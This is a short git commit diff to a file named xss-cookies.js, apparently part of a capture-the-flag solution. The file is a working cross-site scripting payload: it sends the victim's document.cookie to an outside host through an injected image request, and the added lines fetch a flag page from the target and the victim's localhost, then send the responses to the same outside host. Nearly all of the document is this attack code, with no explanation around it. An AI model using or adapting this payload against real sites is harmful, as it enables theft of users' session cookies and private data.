d9289ab5abd8abbe920e58e8165656c860972bbc
Xenos <dev.coding@reinom.com>
2023-11-21 19:50:08 +0100

    Update xss-cookies.js
    FLAG

--- xss-cookies.js
+++ xss-cookies.js
@@ -4,6 +4,14 @@
   x.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie);
   document.body.appendChild(x);
 
+  fetch("http://website-zyvfuj.inst.malicecyber.com/FLAG")
+    .then(r => r.text())
+    .then(t=>{
+      const y = new Image();
+      y.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?FLAG1="+t);
+      document.body.appendChild(y);
+    });
+  
   fetch("http://localhost:5000/FLAG")
     .then(r => r.text())
     .then(t=>{
